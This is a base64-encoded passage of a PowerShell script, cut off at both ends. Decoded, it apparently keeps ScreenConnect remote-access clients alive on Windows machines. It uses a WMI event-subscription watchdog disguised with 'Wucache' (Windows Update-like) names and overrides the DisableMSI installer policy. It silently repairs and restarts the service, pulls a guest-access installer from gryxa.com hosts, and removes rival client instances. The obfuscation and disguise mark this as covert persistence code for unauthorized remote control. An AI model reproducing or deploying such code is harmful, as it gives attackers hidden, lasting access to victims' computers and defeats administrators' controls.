fSBjYXRjaCB7ICRvayA9ICRmYWxzZSB9CiAgICByZXR1cm4gJG9rCn0KCmZ1bmN0aW9uIFRlc3Qt
V2F0Y2hkb2dHcmFwaCB7CiAgICAkdCA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1
YnNjcmlwdGlvbiAtQ2xhc3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gLUZpbHRlciAiVGlt
ZXJJZD0nV3VjYWNoZVdhdGNoZG9nJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
ICRmID0gR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBf
X0V2ZW50RmlsdGVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0YnIiAtRXJyb3JBY3Rp
b24gU2lsZW50bHlDb250aW51ZQogICAgJGMgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9v
dFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJO
YW1lPSdXdWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
ICRiID0gJG51bGwKICAgIGlmICgkZiAtYW5kICRjKSB7CiAgICAgICAgJGIgPSBHZXQtV21pT2Jq
ZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1l
ckJpbmRpbmcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVy
ZS1PYmplY3QgeyAkXy5GaWx0ZXIgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dGKicgLWFuZCAkXy5D
b25zdW1lciAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0MqJyB9IHwKICAgICAgICAgICAgU2VsZWN0
LU9iamVjdCAtRmlyc3QgMQogICAgfQogICAgcmV0dXJuIFtib29sXSgkdCAtYW5kICRmIC1hbmQg
JGMgLWFuZCAkYikKfQoKZnVuY3Rpb24gRW5zdXJlLVdhdGNoZG9nIHsKICAgIGlmIChUZXN0LVdh
dGNoZG9nR3JhcGgpIHsgcmV0dXJuICdPSycgfQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0
dXJuICdNSVNTSU5HJyB9CiAgICBpZiAoSW5zdGFsbC1XYXRjaGRvZykgeyByZXR1cm4gJ1JFQVJN
RUQnIH0KICAgIHJldHVybiAnRkFJTCcKfQoKIyBDb3JyZWN0IDMyLWJpdCArIDY0LWJpdCBBUlAg
aGl2ZXMuIEw2IGFuZCBlYXJsaWVyIHVzZWQgYSB0cnVuY2F0ZWQKIyBXT1c2NDMyTm9kZSBwYXRo
IChtaXNzaW5nIE1pY3Jvc29mdFxXaW5kb3dzKSBzbyBFVkVSWSAzMi1iaXQgU0MgcHJvZHVjdAoj
IHdhcyBpbnZpc2libGUgdG8gcmVwYWlyL2V4dGVybWluYXRlL3JlZ2lzdGVyZWQuCiRzY3JpcHQ6
VW5pbnN0YWxsUm9vdHMgPSBAKAogICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dz
XEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsCiAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5v
ZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJwopCgpmdW5jdGlv
biBUZXN0LVNDUmVnaXN0ZXJlZChbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgIyBMODogTkVW
RVIgdXNlIHJldHVybiBpbnNpZGUgRm9yRWFjaC1PYmplY3QgLSBpdCBvbmx5IGV4aXRzIHRoZQog
ICAgIyBwaXBlbGluZSBpdGVyYXRpb24sIHNvIHRoaXMgZnVuY3Rpb24gYWx3YXlzIGZlbGwgdGhy
b3VnaCB0byAnbm8nCiAgICAjIGFuZCB0aGUgbW9uIG9ycGhhbi1sYWRkZXIgZGVsZXRlZCBoZWFs
dGh5IHJlZ2lzdGVyZWQgc2VydmljZXMuCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0
dXJuICdubycgfQogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmlu
dCkiCiAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAg
ICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgY29udGludWUgfQogICAgICAgIGZvcmVh
Y2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUpKSB7CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRo
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICBp
ZiAoJGRuIC1hbmQgKCRkbiAtaWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1saWtl
ICd7Kn0nKSkgeyByZXR1cm4gJ3llcycgfQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAnbm8n
Cn0KCmZ1bmN0aW9uIFJlcGFpci1TQ1NlcnZpY2UoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAg
ICMgUmVjcmVhdGVzIGEgZGVsZXRlZCBTQyBzZXJ2aWNlIGVudHJ5IGJ5IHJlcGFpcmluZyB0aGUg
UkVHSVNURVJFRCBwcm9kdWN0LgogICAgIyBtc2lleGVjIC9mYSB7R1VJRH0gcmVwYWlycyBpbiBw
bGFjZSAtIGl0IGRvZXMgTk9UIHJ1biB0aGUgU0MtZmFtaWx5CiAgICAjIG1ham9yLXVwZ3JhZGUg
cmVtb3ZhbCwgc28gb3RoZXIgaW5zdGFuY2VzIGFyZSB1bnRvdWNoZWQuCiAgICAjIEw1OiBhbHNv
IGhhbmRsZXMgcHJlc2VudC1idXQtU1RPUFBFRCBzZXJ2aWNlcyAocmVwYWlyIHJlc3RvcmVzIGJp
bmFyaWVzLAogICAgIyB0aGVuIHN0YXJ0KS4gT25seSBhIFJ1bm5pbmcgc2VydmljZSBpcyBjb25z
aWRlcmVkIGhlYWx0aHkuCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICduby1m
cCcgfQogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAg
ICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUKICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVxICdSdW5uaW5nJykgeyByZXR1
cm4gJ3N2Yy1ydW5uaW5nJyB9CiAgICAkZ3VpZCA9ICRudWxsCiAgICBmb3JlYWNoICgkcm9vdCBp
biAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAk
cm9vdCkpIHsgY29udGludWUgfQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0
ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAgICAgICAgICRk
biA9IChHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoJGRuIC1hbmQgKCRkbiAtaWVxICRu
YW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1saWtlICd7Kn0nKSkgeyAkZ3VpZCA9ICRrZXku
UFNDaGlsZE5hbWU7IGJyZWFrIH0KICAgICAgICB9CiAgICAgICAgaWYgKCRndWlkKSB7IGJyZWFr
IH0KICAgIH0KICAgIGlmICgtbm90ICRndWlkKSB7IHJldHVybiAnbm90LXJlZ2lzdGVyZWQnIH0K
ICAgICYgcmVnLmV4ZSBkZWxldGUgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdp
bmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC9mIDI+JjEgfCBPdXQtTnVsbAogICAgJiBy
ZWcuZXhlIGFkZCAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0
YWxsZXInIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgMj4mMSB8IE91dC1OdWxs
CiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICJtc2lfcmVwYWlyXyRGaW5nZXJwcmludC5s
b2ciCiAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL2Zh
ICRndWlkIC9xbiAvbm9yZXN0YXJ0IC9MKnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhydQogICAg
U3RhcnQtU2xlZXAgLVNlY29uZHMgOAogICAgJiBzYy5leGUgY29uZmlnICIkbmFtZSIgc3RhcnQ9
IGF1dG8gMj4mMSB8IE91dC1OdWxsCiAgICAmIHNjLmV4ZSBzdGFydCAiJG5hbWUiIDI+JjEgfCBP
dXQtTnVsbAogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNAogICAgJHN2YyA9IEdldC1TZXJ2aWNl
IC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoJHN2YyAt
YW5kICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycpIHsgcmV0dXJuICJzdmMtcmVzdG9yZWQgZXhp
dD0kKCRwLkV4aXRDb2RlKSIgfQogICAgaWYgKCRzdmMpIHsgcmV0dXJuICJzdmMtc3RpbGwtc3Rv
cHBlZCBleGl0PSQoJHAuRXhpdENvZGUpIiB9CiAgICByZXR1cm4gInN2Yy1zdGlsbC1taXNzaW5n
IGV4aXQ9JCgkcC5FeGl0Q29kZSkiCn0KCiMg4pSA4pSAIEdyeXhhIE1VU1QtUlVOIGhlYWx0aCAo
TDE2KSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKIyBMMTY6IE5F
VkVSIHJlaW5zdGFsbCB3aGVuIHNlcnZpY2UgaXMgUnVubmluZyAocGFuZWwgZHVwbGljYXRlcyku
CiMgICAgICBUQ1AvcmVsYXkgYXJlIGFkdmlzb3J5IG9ubHkuIFJlaW5zdGFsbCBvbmx5OiBtaXNz
aW5nL3N0b3BwZWQgT1IgRlAgZHJpZnQgT1IgLUZvcmNlLgojIEwxNTogZ3J5eGEtaGVhbHRoIC8g
Z3J5eGEtZW5zdXJlIOKAlCA4aCBkZWVwIGNoZWNrIChUQ1AvcmVsYXkvRlAgZHJpZnQgcmVpbnN0
YWxsKS4KJHNjcmlwdDpHcnl4YURlZmF1bHRGcCA9ICc5OTA4MTk4ZTY2OGU0NzUwJwokc2NyaXB0
OkdyeXhhTXNpVXJsID0gJ2h0dHBzOi8vdWkuZ3J5eGEuY29tL0Jpbi9TY3JlZW5Db25uZWN0LkNs
aWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0Jwokc2NyaXB0OkdyeXhhUmVsYXlIb3N0ID0g
J3VwZGF0ZS5ncnl4YS5jb20nCiRzY3JpcHQ6R3J5eGFVaUhvc3QgPSAndWkuZ3J5eGEuY29tJwok
c2NyaXB0OlNldnJ6S2VlcCA9IEAoJzVmNjAxMDU3OTg1MmU1MDcnLCAnZjg2MWM4MTQwZDQ1MzQy
NycpCgpmdW5jdGlvbiBHZXQtR3J5eGFDZmdQYXRoIHsgSm9pbi1QYXRoICRXb3JrRGlyICdncnl4
YS5jZmcnIH0KCmZ1bmN0aW9uIEdldC1Hcnl4YUZwIHsKICAgICRmcCA9ICRzY3JpcHQ6R3J5eGFE
ZWZhdWx0RnAKICAgICRwID0gR2V0LUdyeXhhQ2ZnUGF0aAogICAgaWYgKFRlc3QtUGF0aCAtTGl0
ZXJhbFBhdGggJHApIHsKICAgICAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlm
ICgkXyAtbWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZwID0g
JG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJGZwCn0K
CmZ1bmN0aW9uIFNldC1Hcnl4YUZwKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICBpZiAoLW5v
dCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuIH0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVy
YWxQYXRoICRXb3JrRGlyKSkgewogICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3Rvcnkg
LVBhdGggJFdvcmtEaXIgLUZvcmNlIHwgT3V0LU51bGwKICAgIH0KICAgIEAoCiAgICAgICAgIkNV
UlJFTlRfRlA9JCgkRmluZ2VycHJpbnQuVG9Mb3dlcigpKSIKICAgICAgICAiUkVMQVk9JCgkc2Ny
aXB0OkdyeXhhUmVsYXlIb3N0KSIKICAgICAgICAiVUk9JCgkc2NyaXB0OkdyeXhhVWlIb3N0KSIK
ICAgICAgICAiTVNJVVJMPSQoJHNjcmlwdDpHcnl4YU1zaVVybCkiCiAgICAgICAgIlVQREFURUQ9
JCgoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykpIgogICAgKSB8IFNl
dC1Db250ZW50IC1MaXRlcmFsUGF0aCAoR2V0LUdyeXhhQ2ZnUGF0aCkgLUVuY29kaW5nIEFTQ0lJ
IC1Gb3JjZQp9CgpmdW5jdGlvbiBHZXQtS2VlcEZpbmdlcnByaW50cyB7CiAgICAkZyA9IEdldC1H
cnl4YUZwCiAgICBAKCc1ZjYwMTA1Nzk4NTJlNTA3JywgJ2Y4NjFjODE0MGQ0NTM0MjcnLCAkZykg
fCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUKfQoKZnVuY3Rpb24gVGVzdC1UY3BIb3N0UG9ydChbc3Ry
aW5nXSRIb3N0TmFtZSwgW2ludF0kUG9ydCA9IDQ0MywgW2ludF0kVGltZW91dE1zID0gODAwMCkg
ewogICAgaWYgKC1ub3QgJEhvc3ROYW1lKSB7IHJldHVybiAkZmFsc2UgfQogICAgJGNsaWVudCA9
ICRudWxsCiAgICB0cnkgewogICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQu
U29ja2V0cy5UY3BDbGllbnQKICAgICAgICAkaWFyID0gJGNsaWVudC5CZWdpbkNvbm5lY3QoJEhv
c3ROYW1lLCAkUG9ydCwgJG51bGwsICRudWxsKQogICAgICAgIGlmICgtbm90ICRpYXIuQXN5bmNX
YWl0SGFuZGxlLldhaXRPbmUoJFRpbWVvdXRNcywgJGZhbHNlKSkgewogICAgICAgICAgICB0cnkg
eyAkY2xpZW50LkNsb3NlKCkgfSBjYXRjaCB7fQogICAgICAgICAgICByZXR1cm4gJGZhbHNlCiAg
ICAgICAgfQogICAgICAgICRjbGllbnQuRW5kQ29ubmVjdCgkaWFyKQogICAgICAgIHJldHVybiAk
dHJ1ZQogICAgfSBjYXRjaCB7CiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfSBmaW5hbGx5IHsK
ICAgICAgICBpZiAoJGNsaWVudCkgeyB0cnkgeyAkY2xpZW50LkNsb3NlKCkgfSBjYXRjaCB7fSB9
CiAgICB9Cn0KCmZ1bmN0aW9uIEdldC1Nc2lQcm9wZXJ0eShbc3RyaW5nXSRNc2lQYXRoLCBbc3Ry
aW5nXSRQcm9wZXJ0eU5hbWUpIHsKICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRo
ICRNc2lQYXRoKSkgeyByZXR1cm4gJG51bGwgfQogICAgdHJ5IHsKICAgICAgICAkaW5zdGFsbGVy
ID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdpbmRvd3NJbnN0YWxsZXIuSW5zdGFsbGVyCiAgICAg
ICAgJGRiID0gJGluc3RhbGxlci5PcGVuRGF0YWJhc2UoKFJlc29sdmUtUGF0aCAtTGl0ZXJhbFBh
dGggJE1zaVBhdGgpLlBhdGgsIDApCiAgICAgICAgJHZpZXcgPSAkZGIuT3BlblZpZXcoIlNFTEVD
VCBgVmFsdWVgIEZST00gYFByb3BlcnR5YCBXSEVSRSBgUHJvcGVydHlgPSckUHJvcGVydHlOYW1l
JyIpCiAgICAgICAgJHZpZXcuRXhlY3V0ZSgpIHwgT3V0LU51bGwKICAgICAgICAkcmVjID0gJHZp
ZXcuRmV0Y2goKQogICAgICAgIGlmICgtbm90ICRyZWMpIHsgcmV0dXJuICRudWxsIH0KICAgICAg
ICByZXR1cm4gW3N0cmluZ10kcmVjLlN0cmluZ0RhdGEoMSkKICAgIH0gY2F0Y2ggewogICAgICAg
IHJldHVybiAkbnVsbAogICAgfQp9CgpmdW5jdGlvbiBHZXQtRnBGcm9tUHJvZHVjdE5hbWUoW3N0
cmluZ10kUHJvZHVjdE5hbWUpIHsKICAgIGlmICgkUHJvZHVjdE5hbWUgLW1hdGNoICdcKChbMC05
YS1mQS1GXXsxNn0pXCknKSB7IHJldHVybiAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkgfQogICAgcmV0
dXJuICRudWxsCn0KCmZ1bmN0aW9uIEZpbmQtUHJvZHVjdEd1aWQoW3N0cmluZ10kRmluZ2VycHJp
bnQpIHsKICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIgog
ICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAgIGlm
ICgtbm90IChUZXN0LVBhdGggJHJvb3QpKSB7IGNvbnRpbnVlIH0KICAgICAgICBmb3JlYWNoICgk
a2V5IGluIChHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
KSkgewogICAgICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJy
b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUKICAgICAgICAgICAgaWYgKCRk
biAtYW5kICgkZG4gLWllcSAkbmFtZSkgLWFuZCAoJGtleS5QU0NoaWxkTmFtZSAtbGlrZSAneyp9
JykpIHsKICAgICAgICAgICAgICAgIHJldHVybiAka2V5LlBTQ2hpbGROYW1lCiAgICAgICAgICAg
IH0KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJG51bGwKfQoKZnVuY3Rpb24gVGVzdC1Hcnl4
YVJlbGF5Q29uZmlndXJlZChbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgJG5hbWUgPSAiU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICAkZGlycyA9IEAoCiAgICAgICAg
KEpvaW4tUGF0aCAke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICgkRmluZ2VycHJpbnQpIiksCiAgICAgICAgKEpvaW4tUGF0aCAkZW52OlByb2dyYW1GaWxlcyAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiKQogICAgKQogICAgJHBhdHRlcm5z
ID0gQCgndXBkYXRlLmdyeXhhLmNvbScsICd1aS5ncnl4YS5jb20nLCAnZ3J5eGEuY29tJykKICAg
IGZvcmVhY2ggKCRkIGluICRkaXJzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0
ZXJhbFBhdGggJGQpKSB7IGNvbnRpbnVlIH0KICAgICAgICAkZmlsZXMgPSBAKEdldC1DaGlsZEl0
ZW0gLUxpdGVyYWxQYXRoICRkIC1GaWxlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwg
U2VsZWN0LU9iamVjdCAtRmlyc3QgNjApCiAgICAgICAgZm9yZWFjaCAoJGYgaW4gJGZpbGVzKSB7
CiAgICAgICAgICAgIGZvcmVhY2ggKCRwYXQgaW4gJHBhdHRlcm5zKSB7CiAgICAgICAgICAgICAg
ICBpZiAoU2VsZWN0LVN0cmluZyAtTGl0ZXJhbFBhdGggJGYuRnVsbE5hbWUgLVBhdHRlcm4gJHBh
dCAtU2ltcGxlTWF0Y2ggLVF1aWV0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSB7CiAg
ICAgICAgICAgICAgICAgICAgcmV0dXJuICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAg
ICAgIH0KICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICgkZi5MZW5ndGggLWd0
IDJNQikgeyBjb250aW51ZSB9CiAgICAgICAgICAgICAgICAkYnl0ZXMgPSBbU3lzdGVtLklPLkZp
bGVdOjpSZWFkQWxsQnl0ZXMoJGYuRnVsbE5hbWUpCiAgICAgICAgICAgICAgICAkdGV4dCA9IFtT
eXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRieXRlcykKICAgICAgICAg
ICAgICAgIGlmICgkdGV4dCAtbWF0Y2ggJ2dyeXhhXC5jb20nKSB7IHJldHVybiAkdHJ1ZSB9CiAg
ICAgICAgICAgICAgICAkdGV4dDggPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0
cmluZygkYnl0ZXMpCiAgICAgICAgICAgICAgICBpZiAoJHRleHQ4IC1tYXRjaCAnZ3J5eGFcLmNv
bScpIHsgcmV0dXJuICR0cnVlIH0KICAgICAgICAgICAgfSBjYXRjaCB7fQogICAgICAgIH0KICAg
IH0KICAgICRpbWcgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250
cm9sU2V0XFNlcnZpY2VzXCRuYW1lIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuSW1h
Z2VQYXRoCiAgICBpZiAoJGltZyAtYW5kICgkaW1nIC1tYXRjaCAnZ3J5eGFcLmNvbScpKSB7IHJl
dHVybiAkdHJ1ZSB9CiAgICBpZiAoRmluZC1Qcm9kdWN0R3VpZCAkRmluZ2VycHJpbnQpIHsgcmV0
dXJuICR0cnVlIH0KICAgIHJldHVybiAkZmFsc2UKfQoKZnVuY3Rpb24gVGVzdC1TY1J1bm5pbmco
W3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1
cm4gJGZhbHNlIH0KICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAiU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCRGaW5nZXJwcmludCkiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBy
ZXR1cm4gW2Jvb2xdKCRzdmMgLWFuZCAkc3ZjLlN0YXR1cyAtZXEgJ1J1bm5pbmcnKQp9CgpmdW5j
dGlvbiBUZXN0LVNjRGlyKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICBmb3JlYWNoICgkYmFz
ZSBpbiBAKCR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSwgJGVudjpQcm9ncmFtRmlsZXMpKSB7CiAg
ICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkYmFzZSAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiKSkgeyByZXR1cm4gJHRydWUgfQogICAgfQog
ICAgcmV0dXJuICRmYWxzZQp9CgpmdW5jdGlvbiBGaW5kLVJ1bm5pbmdHcnl4YUZwIHsKICAgICMg
QU5ZIG5vbi1zZXZyeiBTY3JlZW5Db25uZWN0IENsaWVudCB0aGF0IGlzIFJ1bm5pbmcgY291bnRz
IGFzIEdyeXhhLgogICAgIyBEbyBOT1QgcmVxdWlyZSByZWxheS1zdHJpbmcgc2NhbiAoZmFsc2Ug
bmVnYXRpdmVzIGNhdXNlZCByZWluc3RhbGwgbG9vcHMpLgogICAgJGNmZyA9IEdldC1Hcnl4YUZw
CiAgICBpZiAoVGVzdC1TY1J1bm5pbmcgJGNmZykgeyByZXR1cm4gJGNmZyB9CiAgICBmb3JlYWNo
ICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJyAtRXJy
b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICBpZiAoJHN2Yy5TdGF0dXMgLW5l
ICdSdW5uaW5nJykgeyBjb250aW51ZSB9CiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1wo
KFswLTlhLWZdezE2fSlcKScpIHsKICAgICAgICAgICAgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dl
cigpCiAgICAgICAgICAgIGlmICgkZnAgLWluICRzY3JpcHQ6U2V2cnpLZWVwKSB7IGNvbnRpbnVl
IH0KICAgICAgICAgICAgcmV0dXJuICRmcAogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAkbnVs
bAp9CgpmdW5jdGlvbiBUZXN0LUFueU5vblNldnJ6U2NSdW5uaW5nIHsKICAgIHJldHVybiBbYm9v
bF0oRmluZC1SdW5uaW5nR3J5eGFGcCkKfQoKZnVuY3Rpb24gVGVzdC1Hcnl4YUhlYWx0aCB7CiAg
ICAjIExPQ0FMIGhlYWx0aCBvbmx5LiBUQ1AvcmVsYXkgbmV2ZXIgbWFyayBVTkhFQUxUSFkgKGF2
b2lkcyBwYW5lbCBkdXBsaWNhdGVzKS4KICAgICRmcCA9IEdldC1Hcnl4YUZwCiAgICAkcnVubmlu
Z0ZwID0gRmluZC1SdW5uaW5nR3J5eGFGcAogICAgaWYgKCRydW5uaW5nRnApIHsKICAgICAgICBp
ZiAoJHJ1bm5pbmdGcCAtbmUgJGZwKSB7IFNldC1Hcnl4YUZwICRydW5uaW5nRnA7ICRmcCA9ICRy
dW5uaW5nRnAgfQogICAgICAgICR0Y3BSZWxheSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpH
cnl4YVJlbGF5SG9zdCA0NDMKICAgICAgICAkdGNwVWkgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3Jp
cHQ6R3J5eGFVaUhvc3QgNDQzCiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRmcHxydW5uaW5nPTF8
cmVsYXk9JHRjcFJlbGF5fHVpPSR0Y3BVaSIKICAgIH0KCiAgICAkcmVhc29ucyA9IE5ldy1PYmpl
Y3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICBpZiAoLW5vdCAo
VGVzdC1TY1J1bm5pbmcgJGZwKSkgewogICAgICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCRmcCkiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
CiAgICAgICAgaWYgKC1ub3QgJHN2YykgeyBbdm9pZF0kcmVhc29ucy5BZGQoJ3N2Yy1taXNzaW5n
JykgfQogICAgICAgIGVsc2UgeyBbdm9pZF0kcmVhc29ucy5BZGQoInN2Yy0kKCRzdmMuU3RhdHVz
KSIpIH0KICAgIH0KICAgIGlmICgtbm90IChUZXN0LVNjRGlyICRmcCkgLWFuZCAtbm90IChGaW5k
LVByb2R1Y3RHdWlkICRmcCkpIHsKICAgICAgICBbdm9pZF0kcmVhc29ucy5BZGQoJ25vdC1pbnN0
YWxsZWQnKQogICAgfQoKICAgICR0Y3BSZWxheSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpH
cnl4YVJlbGF5SG9zdCA0NDMKICAgICR0Y3BVaSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpH
cnl4YVVpSG9zdCA0NDMKICAgIGlmICgkcmVhc29ucy5Db3VudCAtZXEgMCkgewogICAgICAgICMg
cmVnaXN0ZXJlZC9kaXIgcHJlc2VudCBidXQgc2VydmljZSBub3QgcnVubmluZyDigJQgc3RpbGwg
dW5oZWFsdGh5IGZvciBzdGFydC9yZXBhaXIKICAgICAgICBpZiAoLW5vdCAoVGVzdC1TY1J1bm5p
bmcgJGZwKSkgewogICAgICAgICAgICByZXR1cm4gIlVOSEVBTFRIWXwkZnB8c3ZjLW5vdC1ydW5u
aW5nfHJlbGF5PSR0Y3BSZWxheXx1aT0kdGNwVWkiCiAgICAgICAgfQogICAgICAgIHJldHVybiAi
